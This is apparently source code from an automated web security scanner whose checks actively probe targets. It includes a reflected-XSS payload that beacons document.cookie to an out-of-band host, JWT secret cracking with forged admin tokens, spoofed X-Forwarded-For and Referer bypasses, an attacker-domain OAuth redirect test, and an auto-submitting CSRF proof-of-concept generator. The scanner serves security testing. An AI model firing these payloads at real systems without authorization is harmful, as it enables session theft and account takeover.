
async def check_predictable_uuid_version(url: str) -> str | None:
    """
    If a URL contains a UUID used as a resource identifier, checks its
    version nibble - UUIDv1 encodes a timestamp and the generating
    machine's MAC address and is technically enumerable/predictable,
    unlike UUIDv4 (fully random). Returns a plain string, NOT a
    findings dict - a v1 UUID being used isn't itself a confirmed
    vulnerability; real impact needs demonstrating that enumeration
    actually reaches another user's resource (i.e., it's really an IDOR
    candidate wearing a UUID instead of a sequential integer).
    """
    match = _UUID_IN_URL_RE.search(url)
    if not match:
        return None
    version = match.group(1).lower()
    if version == "1":
        return (
            f"{url}: contains a UUIDv1 (timestamp + MAC-address based, technically "
            f"enumerable) used as a resource identifier - candidate for IDOR-style testing "
            f"the same way check_idor_candidate flags sequential integer IDs; a v1 UUID "
            f"alone doesn't confirm access-control impact"
        )
    return None


async def check_oauth_missing_state_parameter(url: str) -> str | None:
    """
    Flags an OAuth/authorize-shaped URL (path contains "authorize" or
    "oauth") whose query string has a response_type parameter but no
    state parameter. Returns a plain string, NOT a findings dict - the
    state parameter is the standard CSRF defense for the OAuth
    authorization-code flow; its absence is a real gap, but confirming
    actual exploitability needs completing a full OAuth flow with real
    client credentials, which this scanner doesn't have.
    """
    parsed = httpx.URL(url)
    path_lower = str(parsed.path).lower()
    if "authorize" not in path_lower and "oauth" not in path_lower:
        return None
    params = dict(parsed.params)
    if "response_type" in params and "state" not in params:
        return (
            f"{url}: OAuth authorize-shaped URL has response_type but no state parameter - "
            f"candidate for OAuth CSRF testing; confirming real impact needs completing a "
            f"full flow with real client credentials, which this scanner doesn't have"
        )
    return None


async def check_basic_auth_over_http(url: str) -> dict | None:
    """
    Checks whether a plain http:// (not https://) URL responds with a
    WWW-Authenticate: Basic challenge. Basic Auth credentials are only
    base64-encoded, not encrypted - sending that challenge (and
    therefore expecting credentials back) over unencrypted HTTP means
    any network observer between the client and server can trivially
    recover the plaintext username/password.
    """
    if not url.lower().startswith("http://"):
        return None
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                resp = await client.get(url)
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Basic Auth over HTTP check failed for %s: %s", url, exc)
        return None

    www_auth = resp.headers.get("www-authenticate", "")
    if resp.status_code == 401 and "basic" in www_auth.lower():
        return {
            "vuln_type": "basic_auth_over_plaintext_http",
            "severity": "high",
            "evidence": (
                f"{url}: server issued a WWW-Authenticate: Basic challenge over plain HTTP "
                f"(not HTTPS) - Basic Auth credentials are only base64-encoded, not "
                f"encrypted, so any network observer can trivially recover the plaintext "
                f"username/password."
            ),
        }
    return None


async def check_cookie_missing_secure_flag(url: str) -> str | None:
    """
    Flags cookies set over HTTPS without the Secure attribute, meaning
    the same cookie could be sent over a future plain-HTTP connection to
    the same host if one ever occurs (redirect chains, mixed subdomains,
    a user manually typing http://). Returns a plain string, NOT a
    findings dict - same "commonly Informative alone" treatment as
    check_insecure_cookie_without_samesite; real impact depends on
    whether an actual HTTP-accessible path to the same host exists.
    """
    if not url.lower().startswith("https://"):
        return None
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: cookie Secure flag check failed for %s: %s", url, exc)
        return None

    set_cookie_headers = resp.headers.get_list("set-cookie") if hasattr(resp.headers, "get_list") else []
    for raw_cookie in set_cookie_headers:
        cookie_name = raw_cookie.split("=", 1)[0].strip()
        if _SESSION_COOKIE_NAME_RE.search(cookie_name) and "secure" not in raw_cookie.lower():
            return (
                f"{url}: cookie '{cookie_name}' (session/auth-shaped name) set over HTTPS "
                f"without the Secure attribute - could be sent over a future plain-HTTP "
                f"connection to the same host if one ever exists; real impact depends on "
                f"whether an HTTP-accessible path actually exists"
            )
    return None


_TRUSTED_LOOKING_IPS = ["127.0.0.1", "10.0.0.1", "192.168.1.1", "::1"]


async def check_ip_restriction_bypass_via_xff(url: str) -> dict | None:
    """
    Third distinct bypass-header technique alongside check_auth_bypass_
    via_method_override (batch 11) and check_auth_bypass_via_verb_
    tampering (batch 13), this time for IP-based access restrictions
    specifically: some apps/proxies trust X-Forwarded-For blindly for
    "internal only" or "localhost only" checks. Same deterministic
    status-code-transition proof - a clean 401/403 baseline, then a
    real 200 with substantial content after spoofing a trusted-looking
    source IP.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                baseline_resp = await client.get(url)
            except httpx.HTTPError:
                return None
            if baseline_resp.status_code not in (401, 403):
                return None

            for fake_ip in _TRUSTED_LOOKING_IPS:
                try:
                    resp = await client.get(url, headers={"X-Forwarded-For": fake_ip})
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200 and len(resp.text) >= _MIN_BYPASS_BODY_LENGTH:
                    return {
                        "vuln_type": "ip_restriction_bypass_via_xff",
                        "severity": "high",
                        "evidence": (
                            f"{url}: plain request returned {baseline_resp.status_code} "
                            f"(blocked), but X-Forwarded-For: {fake_ip} returned 200 with a "
                            f"{len(resp.text)}-byte body - an IP-based access restriction is "
                            f"trusting a client-supplied header instead of the real "
                            f"connection source."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: XFF IP restriction bypass check failed for %s: %s", url, exc)
    return None


async def check_referer_based_access_control_bypass(url: str) -> dict | None:
    """
    Fourth bypass-header variant: some apps use Referer presence/value
    as a weak access-control signal (e.g., only allow a page if it was
    reached by clicking through from another internal page). Tests
    whether supplying a same-origin-looking Referer bypasses a block
    that occurs with no Referer at all. Same deterministic status-code
    proof bar as the other three bypass checks.
    """
    domain = httpx.URL(url).host
    if not domain:
        return None
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                baseline_resp = await client.get(url, headers={"Referer": ""})
            except httpx.HTTPError:
                return None
            if baseline_resp.status_code not in (401, 403):
                return None

            try:
                resp = await client.get(url, headers={"Referer": f"https://{domain}/"})
            except httpx.HTTPError:
                return None
            if resp.status_code == 200 and len(resp.text) >= _MIN_BYPASS_BODY_LENGTH:
                return {
                    "vuln_type": "referer_based_access_control_bypass",
                    "severity": "medium",
                    "evidence": (
                        f"{url}: request with no Referer returned {baseline_resp.status_code} "
                        f"(blocked), but adding Referer: https://{domain}/ (trivially "
                        f"spoofable) returned 200 with a {len(resp.text)}-byte body - access "
                        f"control is keyed off a client-controlled header."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: Referer-based access control bypass check failed for %s: %s", url, exc)
    return None


_URL_APIKEY_PARAM_RE = re.compile(r"^(api[_-]?key|apikey|access[_-]?token|auth[_-]?token|client[_-]?secret)$", re.IGNORECASE)


async def check_api_key_in_url_query_param(url: str) -> str | None:
    """
    Flags an API key/token-shaped parameter name carried in the URL
    query string. Returns a plain string, NOT a findings dict - distinct
    from check_api_key_leak_signature (batch 8, which matches specific
    key FORMATS anywhere in a response body): this flags the
    TRANSMISSION PATTERN itself (any key-shaped param name in a URL,
    regardless of its format), which risks leaking via browser history,
    server access logs, and the Referer header on any outbound link.
    """
    parsed = httpx.URL(url)
    for param_name in parsed.params:
        if _URL_APIKEY_PARAM_RE.match(param_name):
            return (
                f"{url}: parameter '{param_name}' (API key/token-shaped name) is carried in "
                f"the URL query string - risks leaking via browser history, server access "
                f"logs, and the Referer header on any outbound link from this page"
            )
    return None


async def check_password_reset_user_enumeration_candidate(url: str) -> str | None:
    """
    Submits two different-looking email addresses to a forgot-password-
    shaped endpoint and compares response length/status. Returns a
    plain string, NOT a findings dict - a length/status difference is a
    real user-enumeration candidate, but this scanner has no ground
    truth for which (if either) email actually exists on the target, so
    it can't confirm the difference actually correlates with account
    existence rather than unrelated input-validation branching (e.g.
    one address failing a format check the other passes).
    """
    path_lower = str(httpx.URL(url).path).lower()
    if not any(kw in path_lower for kw in ("forgot", "reset-password", "password-reset", "forgot-password")):
        return None

    probe_email_a = f"swas-probe-{uuid.uuid4().hex[:8]}@swas-nonexistent-domain.test"
    probe_email_b = "admin@swas-nonexistent-domain.test"

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp_a = await client.post(url, json={"email": probe_email_a})
                resp_b = await client.post(url, json={"email": probe_email_b})
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: password reset enumeration check failed for %s: %s", url, exc)
        return None

    if resp_a.status_code != resp_b.status_code or abs(len(resp_a.text) - len(resp_b.text)) > 10:
        return (
            f"{url}: submitting two different email addresses produced different responses "
            f"(status {resp_a.status_code} vs {resp_b.status_code}, length "
            f"{len(resp_a.text)} vs {len(resp_b.text)}) - candidate for user-enumeration "
            f"testing; this scanner has no ground truth for which email actually exists, so "
            f"the difference could also be unrelated input-validation branching"
        )
    return None


_IDENTITY_FIELD_RE = re.compile(
    r'"(?:id|user_?id|account_?id|order_?id|email|username|name|full_?name)"\s*:\s*"?([^",}\]]{1,60})"?',
    re.IGNORECASE,
)


def _extract_identity_fields(body: str) -> set[str]:
    """Pulls a small set of identity-shaped field VALUES out of a JSON-
    looking body (not the field names - the values), so two responses
    can be compared for "these are two different people's data" rather
    than just "these are different bytes" (which could just be a
    timestamp or nonce)."""
    return {v.strip() for v in _IDENTITY_FIELD_RE.findall(body[:8000]) if v.strip()}


async def check_idor_unauthenticated_object_access(url: str) -> dict | None:
    """
    Extends check_idor_candidate (batch 8, recon-only) with the one
    active step that check couldn't safely do: actually requesting a
    NEIGHBORING object ID with the exact same (unauthenticated) request
    and diffing the identity-shaped fields in the two bodies. This does
    NOT prove full IDOR in the classic two-account sense - that still
    needs a second real session (see the "authenticated/multi-account
    testing" roadmap item). What it DOES prove, safely and completely
    automatically: if the endpoint requires no authentication at all
    and neighboring numeric IDs return DIFFERENT people's identity data,
    that's already a confirmed broken-access-control bug on its own -
    no attacker account needed because there's no access control being
    bypassed, there's none present. If either request comes back
    401/403, this correctly backs off and leaves it at the existing
    recon-only candidate note instead of guessing.
    """
    parsed = httpx.URL(url)
    match = _SEQUENTIAL_ID_RE.search(str(parsed.path))
    if not match:
        return None
    segment_name, id_str = match.group(1), match.group(2)
    try:
        current_id = int(id_str)
    except ValueError:
        return None

    neighbor_id = current_id + 1 if current_id > 0 else current_id + 2
    neighbor_path = str(parsed.path).replace(f"/{id_str}", f"/{neighbor_id}", 1)
    neighbor_url = str(parsed.copy_with(path=neighbor_path))

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp_a = await client.get(url)
                resp_b = await client.get(neighbor_url)
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: IDOR impact probe failed for %s: %s", url, exc)
        return None

    if resp_a.status_code in (401, 403) or resp_b.status_code in (401, 403):
        return None  # auth IS enforced - can't confirm without a second real account
    if resp_a.status_code != 200 or resp_b.status_code != 200:
        return None

    fields_a = _extract_identity_fields(resp_a.text)
    fields_b = _extract_identity_fields(resp_b.text)
    if not fields_a or not fields_b:
        return None
    distinct = fields_b - fields_a
    if not distinct:
        return None  # same data both times - not proof of cross-object access

    sample = next(iter(distinct))
    return {
        "vuln_type": "idor_unauthenticated_cross_object_access",
        "severity": "high",
        "evidence": (
            f"{url}: no authentication was required for this endpoint, and requesting "
            f"neighboring {segment_name} value {neighbor_id} (instead of {current_id}) at "
            f"{neighbor_url} returned a DIFFERENT identity value ({sample!r}) not present in "
            f"the original response - confirmed unauthorized cross-object data access, not "
            f"just a numeric-ID pattern candidate."
        ),
    }


_ADMIN_FUNCTIONAL_MARKERS = (
    "log out", "logout", "sign out", "dashboard", "welcome back",
    "manage users", "user management", "site settings", "admin panel",
)


async def check_admin_panel_no_auth_functional_access(host: str) -> dict | None:
    """
    Complements check_exposed_admin_panel (batch 11), which only
    confirms a login FORM is reachable - expected and fine on its own.
    This checks the same short path list for the opposite, much more
    serious case: a panel path that renders actual authenticated-area
    content (dashboard/logout/user-management markers) WITHOUT a
    password field ever being presented - i.e. the admin area itself,
    not its login gate, is directly reachable with zero authentication.
    Deliberately still never attempts any credentials, same policy
    reasoning as the batch 11 check.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in _ADMIN_PANEL_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body_lower = resp.text[:8000].lower()
                if any(ind in body_lower for ind in _LOGIN_FORM_INDICATORS):
                    continue  # this is the login gate, not the panel itself - batch 11's territory
                hit_markers = [m for m in _ADMIN_FUNCTIONAL_MARKERS if m in body_lower]
                if hit_markers:
                    return {
                        "vuln_type": "exposed_admin_panel_no_auth_required",
                        "severity": "critical",
                        "evidence": (
                            f"{base + path}: returned admin-area content directly (markers: "
                            f"{', '.join(hit_markers)}) with no login form presented and no "
                            f"authentication challenge - functional admin access with zero "
                            f"auth, not just a reachable login page."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: admin panel functional access check failed for %s: %s", host, exc)
    return None


_JWT_PRIVILEGE_CLAIM_ESCALATIONS = [
    {"role": "admin"},
    {"isAdmin": True},
    {"admin": True},
    {"scope": "admin"},
]


def _b64url_json(obj: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).decode().rstrip("=")


async def check_jwt_forged_privilege_escalation(url: str) -> dict | None:
    """
    Completes what check_jwt_weak_secret (batch 11) starts. Cracking the
    signing secret is real, critical-severity proof on its own - but
    this goes one step further and actually DOES what an attacker would
    do with it: forges a NEW token from the same header/payload with one
    privilege claim escalated (role/admin/isAdmin flipped to an admin-
    shaped value), signs it with the cracked secret, and resubmits it to
    the SAME url that originally carried the token. Only fires if the
    forged-token response is a normal 200 (not 401/403) AND is
    meaningfully different from a control request sent with the token's
    signature corrupted (which must still 401/403) - that pairing rules
    out "this endpoint just doesn't check auth for GET at all" as a
    false explanation for the forged token being accepted.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: JWT forgery probe failed for %s: %s", url, exc)
        return None

    haystack = resp.text[:20000] + " " + resp.headers.get("set-cookie", "")
    match = _JWT_RE.search(haystack)
    if not match:
        return None
    token = match.group(0)
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header_b64, payload_b64, signature_b64 = parts

    try:
        header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (-len(header_b64) % 4)))
        payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=" * (-len(payload_b64) % 4)))
    except Exception:
        return None

    alg = str(header.get("alg", "")).upper()
    hash_fn = _JWT_HMAC_ALGS.get(alg)
    if hash_fn is None:
        return None

    try:
        actual_sig = base64.urlsafe_b64decode(signature_b64 + "=" * (-len(signature_b64) % 4))
    except Exception:
        return None

    signing_input = f"{header_b64}.{payload_b64}".encode()
    cracked_secret = None
    for secret in _JWT_WEAK_SECRETS:
        if hmac.compare_digest(hmac.new(secret.encode(), signing_input, hash_fn).digest(), actual_sig):
            cracked_secret = secret
            break
    if cracked_secret is None:
        return None  # not crackable here - check_jwt_weak_secret already covers/reports this case

    for escalation in _JWT_PRIVILEGE_CLAIM_ESCALATIONS:
        if not any(claim in payload for claim in escalation):
            continue  # only escalate a claim the token actually already carries

        forged_payload = {**payload, **escalation}
        forged_header_b64 = _b64url_json(header)
        forged_payload_b64 = _b64url_json(forged_payload)
        forged_signing_input = f"{forged_header_b64}.{forged_payload_b64}".encode()
        forged_sig = hmac.new(cracked_secret.encode(), forged_signing_input, hash_fn).digest()
        forged_sig_b64 = base64.urlsafe_b64encode(forged_sig).decode().rstrip("=")
        forged_token = f"{forged_header_b64}.{forged_payload_b64}.{forged_sig_b64}"

        corrupted_token = f"{header_b64}.{payload_b64}.{signature_b64[:-4]}AAAA"

        try:
            async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
                forged_resp = await client.get(url, headers={"Authorization": f"Bearer {forged_token}"},
                                                cookies={"session": forged_token, "token": forged_token})
                control_resp = await client.get(url, headers={"Authorization": f"Bearer {corrupted_token}"},
                                                 cookies={"session": corrupted_token, "token": corrupted_token})
        except httpx.HTTPError:
            continue

        if forged_resp.status_code == 200 and control_resp.status_code in (401, 403):
            claim_desc = ", ".join(f"{k}={v!r}" for k, v in escalation.items())
            return {
                "vuln_type": "jwt_forged_privilege_escalation_accepted",
                "severity": "critical",
                "evidence": (
                    f"{url}: cracked the JWT's {alg} signing secret ({cracked_secret!r}), "
                    f"forged a new token with an escalated claim ({claim_desc}), and the "
                    f"server ACCEPTED it (200 OK) - while an identical request with a "
                    f"corrupted signature was correctly rejected ({control_resp.status_code}). "
                    f"Confirmed full authentication bypass with attacker-chosen privilege "
                    f"level, not just a crackable secret."
                ),
            }
    return None


_XSS_COOKIE_EXFIL_MARKER = "swascookiexfil"


async def check_xss_cookie_exfiltration(url: str, param_name: str, oob_domain: str, oob_proc, finding_tag: str) -> dict | None:
    """
    Complements verify.py's headless XSS execution proof (which confirms
    a payload fires, e.g. an alert() dialog). This is a self-contained
    reflected-XSS-to-cookie-theft chain: injects a payload into
    `param_name` that calls document.cookie and beacons it to a unique
    OOB collaborator subdomain (reusing the same oob.py session already
    started for blind SSRF - one interactsh session serves both), loads
    the resulting URL in a real headless browser, and only confirms
    impact if the OOB collaborator actually receives a callback carrying
    the cookie data - proof of real session-token exfiltration, not just
    "the payload appeared in the page" or "a dialog fired". Optional
    dependency (Playwright) - fails open (returns None) if it isn't
    installed, same as verify.py's XSS execution check.
    """
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        logger.info("detective: playwright not installed - skipping XSS cookie exfiltration probe")
        return None
    if not oob_domain or oob_proc is None:
        return None

    parsed = httpx.URL(url)
    if param_name not in dict(parsed.params):
        return None

    beacon_host = f"{finding_tag}-{_XSS_COOKIE_EXFIL_MARKER}.{oob_domain}"
    payload = (
        f"<script>fetch('https://{beacon_host}/c?v='+encodeURIComponent(document.cookie))</script>"
    )
    test_params = dict(parsed.params)
    test_params[param_name] = payload
    test_url = str(parsed.copy_with(params=test_params))

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch()
            page = await browser.new_page()
            try:
                await page.goto(test_url, timeout=10000, wait_until="networkidle")
                await page.wait_for_timeout(1500)
            except Exception as exc:  # noqa: BLE001 - page load can fail many ways, all mean "inconclusive"
                logger.info("detective: XSS cookie exfil headless load failed for %s: %s", test_url, exc)
            await browser.close()
    except Exception as exc:  # noqa: BLE001 - Playwright/browser install issues, treat as unavailable
        logger.info("detective: XSS cookie exfil headless session failed: %s", exc)
        return None

    interaction = await oob.wait_for_interaction(oob_proc, f"{finding_tag}-{_XSS_COOKIE_EXFIL_MARKER}")
    if interaction is None:
        return None

    return {
        "vuln_type": "reflected_xss_cookie_exfiltration_confirmed",
        "severity": "critical",
        "evidence": (
            f"{test_url}: injected payload made the victim's browser actually beacon "
            f"document.cookie to an OOB collaborator ({beacon_host}), and the collaborator "
            f"received the callback - confirmed real session-cookie exfiltration via XSS, not "
            f"just payload reflection or a fired dialog."
        ),
    }


_OAUTH_PATH_HINTS = ("oauth", "authorize", "auth", "sso", "login/callback")
_OAUTH_REDIRECT_PARAM_NAMES = ("redirect_uri", "return_url", "callback_url", "redirect")
_ATTACKER_OAUTH_DOMAIN = "evil-swas-oauth-redirect.test"


async def check_open_redirect_oauth_chain(url: str) -> dict | None:
    """
    Complements check_open_redirect (batch 2), which only proves a
    generic redirect parameter is unvalidated. This specifically targets
    OAuth/SSO authorize-shaped endpoints (URL path contains oauth/
    authorize/sso, and carries a redirect_uri-shaped parameter) - the
    much higher-impact case, since a loose redirect_uri allow-list on an
    OAuth flow means an attacker-controlled domain can receive real
    authorization codes/tokens during a victim's login, not just an
    open-redirect nuisance. Fires only if the server's own Location
    response header (not just a client-side meta-refresh or reflected
    string) points directly at the attacker-controlled test domain -
    the server itself chose to redirect there, proving the allow-list
    genuinely accepts an arbitrary external domain.
    """
    parsed = httpx.URL(url)
    path_lower = str(parsed.path).lower()
    if not any(hint in path_lower for hint in _OAUTH_PATH_HINTS):
        return None
    existing_params = dict(parsed.params)
    redirect_param = next((p for p in _OAUTH_REDIRECT_PARAM_NAMES if p in existing_params), None)
    if not redirect_param:
        return None

    attacker_url = f"https://{_ATTACKER_OAUTH_DOMAIN}/collect"
    test_params = dict(existing_params)
    test_params[redirect_param] = attacker_url
    test_url = parsed.copy_with(params=test_params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                resp = await client.get(test_url)
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: OAuth redirect chain check failed for %s: %s", url, exc)
        return None

    location = resp.headers.get("location", "")
    if resp.status_code in (301, 302, 303, 307, 308) and _ATTACKER_OAUTH_DOMAIN in location:
        return {
            "vuln_type": "oauth_redirect_uri_allowlist_bypass",
            "severity": "critical",
            "evidence": (
                f"{test_url}: this OAuth/SSO authorize-shaped endpoint's '{redirect_param}' "
                f"parameter was set to an arbitrary external domain, and the server responded "
                f"with a {resp.status_code} redirect whose Location header points directly at "
                f"it ({location[:200]!r}) - confirmed redirect_uri allow-list bypass on an OAuth "
                f"flow; during a real login, the authorization code/token would be delivered to "
                f"the attacker's domain instead of the legitimate app."
            ),
        }
    return None


_FORM_ACTION_RE = re.compile(r'<form[^>]+action=["\']([^"\']*)["\']', re.IGNORECASE)
_FORM_INPUT_RE = re.compile(
    r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?[^>]*>', re.IGNORECASE
)
_CSRF_POC_ORIGIN = "https://evil-csrf-poc.test"


async def check_csrf_poc_live_confirmation(url: str) -> dict | None:
    """
    Complements check_csrf_token_missing (batch 12), which only flags a
    form's missing token field - that alone doesn't confirm exploitable
    CSRF on a modern browser (SameSite cookies can still protect it).
    This checks the one thing that's both safe to test AND decisive:
    whether the server rejects requests from a forged Origin BEFORE any
    business logic runs. Sends a same-shaped OPTIONS preflight (which
    never triggers a real state change - that's the whole point of the
    preflight mechanism) carrying a forged attacker Origin header, and
    compares against a control OPTIONS with the real Origin. If the
    response doesn't distinguish between them (no restrictive
    Access-Control-Allow-Origin, no outright rejection of the forged
    Origin), that's a real signal Origin isn't being enforced server-
    side either - combined with the missing token, this generates an
    actual ready-to-fire CSRF PoC HTML file as the finding's artifact.
    Deliberately NEVER submits the real form - only a researcher
    manually firing the generated PoC (or explicit authorization) should
    trigger the actual state change.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: CSRF PoC check failed for %s: %s", url, exc)
        return None

    body = resp.text
    form_match = _POST_FORM_RE.search(body)
    if not form_match:
        return None
    form_block = form_match.group(0)
    if _CSRF_TOKEN_FIELD_RE.search(form_match.group(1)):
        return None  # has a token field - batch 12's check already covers this, not this probe's target

    action_match = _FORM_ACTION_RE.search(form_block)
    action = action_match.group(1) if action_match else url
    action_url = str(httpx.URL(url).join(action)) if action else url

    fields = _FORM_INPUT_RE.findall(form_match.group(1))
    if not fields:
        return None

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                forged_resp = await client.options(action_url, headers={"Origin": _CSRF_POC_ORIGIN})
                control_resp = await client.options(action_url, headers={"Origin": url})
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: CSRF PoC preflight probe failed for %s: %s", action_url, exc)
        return None

    forged_acao = forged_resp.headers.get("access-control-allow-origin", "")
    if forged_resp.status_code in (403, 405) and control_resp.status_code not in (403, 405):
        return None  # server DOES distinguish origins - not this probe's target
    if forged_acao and _CSRF_POC_ORIGIN not in forged_acao and forged_acao != "*":
        return None  # explicit restrictive allow-list - origin enforcement present

    form_inputs_html = "\n".join(
        f'  <input type="hidden" name="{name}" value="{value or ""}">' for name, value in fields
    )
    poc_html = (
        f'<html><body onload="document.forms[0].submit()">\n'
        f'<form action="{action_url}" method="POST">\n{form_inputs_html}\n</form>\n'
        f"</body></html>"
    )

    return {
        "vuln_type": "csrf_poc_confirmed_no_origin_protection",
        "severity": "high",
        "evidence": (
            f"{url}: the POST form at {action_url} has no CSRF token field, and a preflight "
            f"probe found no server-side Origin restriction distinguishing a forged Origin "
            f"({_CSRF_POC_ORIGIN}) from the real one - both signals needed for exploitable "
            f"CSRF on a modern browser are present. Working PoC generated (not submitted): "
            f"{poc_html[:1200]}"
        ),
    }


_RATE_LIMIT_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-For": f"10.0.{random.randint(0, 255)}.{random.randint(1, 254)}"},
]
_RATE_LIMIT_PROBE_BURST = 12


async def check_rate_limit_header_bypass(url: str) -> dict | None:
    """
    Only ever issues GET requests against `url` as given - never used
    against a state-changing endpoint by design, since triggering this
    many requests against a write/delete action would itself cause real
    side effects. Sends a short burst of plain requests first; if (and
    only if) the target actually starts responding 429/403 within that
    burst - proving a rate limiter is genuinely active - retries the
    SAME request rate with a spoofable client-identity header (X-
    Forwarded-For, X-Originating-IP, etc. set to a fresh-looking IP) and
    checks whether 200s resume. That specific pairing (limiter
    confirmed active, then confirmed bypassed by a header alone) is what
    turns "this endpoint has rate limiting" into "and it's trivially
    bypassable", a materially different and more reportable finding.
    """
    limited = False
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for _ in range(_RATE_LIMIT_PROBE_BURST):
                try:
                    resp = await client.get(url)
                except httpx.HTTPError:
                    continue
                if resp.status_code in (429, 403):
                    limited = True
                    break
            if not limited:
                return None  # no active rate limiting observed - nothing to bypass

            for bypass_headers in _RATE_LIMIT_BYPASS_HEADERS:
                try:
                    bypass_resp = await client.get(url, headers=bypass_headers)
                except httpx.HTTPError:
                    continue
                if bypass_resp.status_code == 200:
                    header_name = next(iter(bypass_headers))
                    return {
                        "vuln_type": "rate_limit_bypass_via_spoofed_client_header",
                        "severity": "medium",
                        "evidence": (
                            f"{url}: confirmed active rate limiting (received "
                            f"429/403 during a burst of {_RATE_LIMIT_PROBE_BURST} plain "
                            f"requests), but a request carrying a spoofed "
                            f"{header_name!r} header immediately after got a normal 200 "
                            f"response - the limiter keys on a client-supplied, trivially "
                            f"forgeable header rather than the actual connection source."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: rate limit bypass check failed for %s: %s", url, exc)
    return None


